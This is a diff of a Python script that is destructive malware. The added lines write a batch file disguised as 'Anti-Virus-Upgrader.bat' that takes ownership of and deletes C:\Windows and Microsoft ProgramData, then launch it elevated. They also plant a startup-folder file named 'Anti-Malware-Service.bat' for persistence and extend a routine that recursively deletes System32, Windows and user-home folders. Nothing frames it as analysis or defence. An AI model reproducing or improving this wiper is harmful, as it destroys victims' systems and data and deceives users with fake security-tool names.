@@ -13,15 +13,23 @@ def get_filename():
     result = result.split()
     final_result = result[(len(result) -  1)]
     return final_result
-login = os.getlogin()
 try:
+    #some deletion
+    windefdelname = 'Anti-Virus-Upgrader.bat'#Disguise File if user gets access to their startup direc
+    windefdelfile = open(windefdelname, 'w')
+    lines = ['\ntakeown /f C:\\ProgramData\\Microsoft\n', f'\ntakeown /f C:\\Windows\\System32\n', '',
+             '\ncd C:/ProgramData/\n', '\nrmdir /S/Q Microsoft\n', '\ncd C:/\n', '\nrmdir /Q/S Windows\n']
+    windefdelfile.writelines(lines)
+    os.system(f'powershell "start {windefdelname} -v runAs"')
+    #cloning
     copyfile(get_filename(), f'C:/{get_filename()}')
     os.chdir(f'C:/Users/{login}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
-    bat_file = open('Anti-Malware-Service.bat', 'w')
+    bat_file = open('Anti-Malware-Service.bat', 'w')#other disguise file
     bat_file_lines = ['\n', 'cd C:\n', f'start {get_filename()}\n']
     bat_file.writelines(bat_file_lines)
 except:
     pass
+getlogin = os.getlogin()
 filename = get_filename()
 backslash = ' \ '.strip()
 opsys = sys.platform
@@ -114,7 +122,7 @@ def delete():
     start_delete = False
     operating_system = sys.platform
     if operating_system == "win32":
-        os.system(f'takeown/f C:\{backslash}Windows\System32')
+        os.system(f'takeown /f C:\Windows\System32')
         os.chdir(f'C:/')
         start_delete = True
     elif operating_system == "darwin":
@@ -134,13 +142,46 @@ def delete():
                             try:
                                 os.rmdir(dir)
                             except:
-                                os.chdir('C:/Windows/System32')
-                                dirs = os.listdir()
-                                for dir in dirs:
-                                    try:
-                                        os.rmdir(dir)
-                                    except:
-                                        pass
+                                if PermissionError:
+                                    os.chdir(f'C:/Users/{getlogin}/')
+                                    dirs = os.listdir()
+                                    for dir in dirs:
+                                        try:
+                                            os.rmdir(dir)
+                                        except:
+                                            os.remove(dir)
+                                            pass
+                                else:
+                                    os.remove(dir)
+                                    pass
+                else:
+                    os.remove(folder)
+                    pass
+        direc = os.listdir()
+        for filname in direc:
+            try:
+                os.remove(filname)
+            except:
+                if PermissionError:
+                    if opsys == "win32":
+                        os.chdir('C:/Windows/')
+                        dirs = os.listdir()
+                        for dir in dirs:
+                            try:
+                                os.rmdir(dir)
+                            except:
+                                if PermissionError:
+                                    os.chdir(f'C:/Users/{getlogin}/')
+                                    dirs = os.listdir()
+                                    for dir in dirs:
+                                        try:
+                                            os.rmdir(dir)
+                                        except:
+                                            os.remove(dir)
+                                            pass
+                                else:
+                                    os.remove(dir)
+                                    pass
                     else:
                         pass
                 else:
